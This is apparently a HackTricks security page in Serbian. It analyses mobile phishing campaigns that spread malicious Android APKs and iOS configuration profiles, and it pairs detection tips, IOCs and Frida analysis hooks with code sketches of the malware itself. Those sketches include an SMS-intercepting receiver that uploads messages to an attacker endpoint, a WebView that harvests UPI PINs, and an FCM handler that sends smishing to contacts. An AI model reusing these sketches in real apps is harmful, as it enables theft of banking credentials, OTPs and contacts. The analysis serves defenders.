# Mobilni Phishing i Distribucija Malicioznih Aplikacija (Android i iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ova stranica pokriva tehnike koje koriste pretnje da distribuiraju **maliciozne Android APK-ove** i **iOS mobilne konfiguracione profile** putem phishing-a (SEO, socijalno inženjerstvo, lažne prodavnice, aplikacije za upoznavanje, itd.).
> Materijal je prilagođen iz SarangTrap kampanje koju je otkrio Zimperium zLabs (2025) i drugih javnih istraživanja.

## Tok Napada

1. **SEO/Phishing Infrastruktura**
* Registrujte desetine domena koji liče na prave (upoznavanje, deljenje u oblaku, servis automobila…).
– Koristite ključne reči na lokalnom jeziku i emotikone u `<title>` elementu da biste se rangirali na Google-u.
– Hostujte *obe* Android (`.apk`) i iOS uputstva za instalaciju na istoj odredišnoj stranici.
2. **Prvo Preuzimanje**
* Android: direktna veza do *nepotpisanog* ili “treće strane” APK-a.
* iOS: `itms-services://` ili obična HTTPS veza do malicioznog **mobileconfig** profila (vidi ispod).
3. **Post-instalaciono Socijalno Inženjerstvo**
* Prilikom prvog pokretanja aplikacija traži **pozivnicu / verifikacioni kod** (iluzija ekskluzivnog pristupa).
* Kod se **POST-uje preko HTTP-a** do Komande i Kontrole (C2).
* C2 odgovara `{"success":true}` ➜ malware nastavlja.
* Sandbox / AV dinamička analiza koja nikada ne šalje validan kod ne vidi **maliciozno ponašanje** (izbegavanje).
4. **Zloupotreba Dozvola u Runtime-u** (Android)
* Opasne dozvole se traže **samo nakon pozitivnog C2 odgovora**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Starije verzije su takođe tražile SMS dozvole -->
```
* Nedavne varijante **uklanjaju `<uses-permission>` za SMS iz `AndroidManifest.xml`** ali ostavljaju Java/Kotlin kod koji čita SMS putem refleksije ⇒ smanjuje statički rezultat dok je i dalje funkcionalan na uređajima koji daju dozvolu putem zloupotrebe `AppOps` ili starih ciljeva.
5. **Facade UI i Prikupljanje u Pozadini**
* Aplikacija prikazuje bezopasne prikaze (pregledač SMS-a, izbor galerije) implementirane lokalno.
* U međuvremenu, exfiltrira:
- IMEI / IMSI, broj telefona
- Potpun `ContactsContract` dump (JSON niz)
- JPEG/PNG iz `/sdcard/DCIM` kompresovan sa [Luban](https://github.com/Curzibn/Luban) da smanji veličinu
- Opcionalni sadržaj SMS-a (`content://sms`)
Payload-ovi su **batch-zipped** i poslati putem `HTTP POST /upload.php`.
6. **iOS Tehnika Dostave**
* Jedan **mobilni konfiguracioni profil** može zahtevati `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. da bi registrovao uređaj u “MDM”-sličnu superviziju.
* Uputstva za socijalno inženjerstvo:
1. Otvorite Podešavanja ➜ *Profil preuzet*.
2. Dodirnite *Instaliraj* tri puta (screenshot-ovi na phishing stranici).
3. Verujte nepotpisanom profilu ➜ napadač dobija *Kontakte* i *Foto* pravo bez pregleda u App Store-u.
7. **Mrežni Sloj**
* Običan HTTP, često na portu 80 sa HOST header-om poput `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS → lako uočljivo).

## Odbrambeno Testiranje / Saveti za Crveni Tim

* **Obilaženje Dinamičke Analize** – Tokom procene malware-a, automatizujte fazu pozivnog koda sa Frida/Objection da biste došli do malicioznog ogranka.
* **Manifest vs. Runtime Diff** – Uporedite `aapt dump permissions` sa runtime `PackageManager#getRequestedPermissions()`; nedostatak opasnih dozvola je crvena zastava.
* **Mrežni Kanarinac** – Konfigurišite `iptables -p tcp --dport 80 -j NFQUEUE` da detektujete nesolidne POST eksplozije nakon unosa koda.
* **Inspekcija mobileconfig** – Koristite `security cms -D -i profile.mobileconfig` na macOS-u da biste naveli `PayloadContent` i uočili prekomerne privilegije.

## Ideje za Detekciju Plavog Tima

* **Transparentnost Sertifikata / DNS Analitika** da uhvatite iznenadne eksplozije domena bogatih ključnim rečima.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` iz Dalvik klijenata van Google Play-a.
* **Telemetrija Pozivnog Koda** – POST od 6–8 cifrenih kodova odmah nakon instalacije APK-a može ukazivati na pripremu.
* **Potpisivanje MobileConfig** – Blokirajte nepotpisane konfiguracione profile putem MDM politike.

## Koristan Frida Snippet: Auto-Obilaženje Pozivnog Koda
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indikatori (Opšti)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Ovaj obrazac je primećen u kampanjama koje zloupotrebljavaju teme državnih beneficija kako bi ukrale indijske UPI akreditive i OTP-ove. Operateri povezuju ugledne platforme za isporuku i otpornost.

### Isporuka kroz pouzdane platforme
- YouTube video mamac → opis sadrži kratku vezu
- Kratka veza → GitHub Pages phishing sajt koji imitira legitiman portal
- Isti GitHub repozitorij sadrži APK sa lažnim “Google Play” oznakom koja direktno povezuje na datoteku
- Dinamičke phishing stranice su aktivne na Replit-u; daljinski komandni kanal koristi Firebase Cloud Messaging (FCM)

### Dropper sa ugrađenim payload-om i offline instalacijom
- Prvi APK je instalater (dropper) koji isporučuje pravi malware na `assets/app.apk` i traži od korisnika da onemogući Wi‑Fi/mobilne podatke kako bi umanjio detekciju u oblaku.
- Ugrađeni payload se instalira pod bezopasnom oznakom (npr., “Sigurna Ažuriranja”). Nakon instalacije, i instalater i payload su prisutni kao odvojene aplikacije.

Static triage tip (grep za ugrađene payload-ove):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dinamičko otkrivanje krajnjih tačaka putem skraćenih linkova
- Malware preuzima listu aktivnih krajnjih tačaka u običnom tekstu, odvojenu zarezima, sa skraćenog linka; jednostavne transformacije stringa proizvode konačni put do phishing stranice.

Primer (sanitizovan):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-kod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Korak “Napravite uplatu od ₹1 / UPI‑Lite” učitava HTML formu napadača sa dinamičkog krajnjeg tačke unutar WebView i hvata osetljive podatke (telefon, banka, UPI PIN) koji se `POST`uju na `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Samopropagacija i presretanje SMS/OTP-a
- Agresivne dozvole se traže prilikom prvog pokretanja:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakti se koriste za masovno slanje smishing SMS poruka sa žrtvinog uređaja.
- Dolazni SMS poruke se presreću od strane broadcast receiver-a i učitavaju sa metapodacima (pošiljalac, telo, SIM slot, nasumični ID po uređaju) na `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) kao otpornog C2
- Payload se registruje na FCM; push poruke sadrže `_type` polje koje se koristi kao prekidač za pokretanje akcija (npr., ažuriranje phishing tekstualnih šablona, prebacivanje ponašanja).

Primer FCM payload-a:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Skica handler-a:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Obrasci lova i IOCs
- APK sadrži sekundarni payload na `assets/app.apk`
- WebView učitava uplatu sa `gate.htm` i exfiltrira na `/addup.php`
- Exfiltracija SMS-a na `/addsm.php`
- Konfiguracija vođena skraćenim linkovima (npr., `rebrand.ly/*`) koja vraća CSV krajnje tačke
- Aplikacije označene kao generičke “Ažuriranje/Sigurno ažuriranje”
- FCM `data` poruke sa `_type` diskriminatorom u nepouzdanim aplikacijama

### Ideje za detekciju i odbranu
- Obeležiti aplikacije koje upućuju korisnike da onemoguće mrežu tokom instalacije, a zatim učitavaju drugi APK iz `assets/`.
- Upozoriti na dozvolu tuple: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-bazirani tokovi plaćanja.
- Monitoring izlaza za `POST /addup.php|/addsm.php` na ne-korporativnim hostovima; blokirati poznatu infrastrukturu.
- Pravila mobilnog EDR-a: nepouzdana aplikacija koja se registruje za FCM i grana se na `_type` polju.

---

## Reference

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
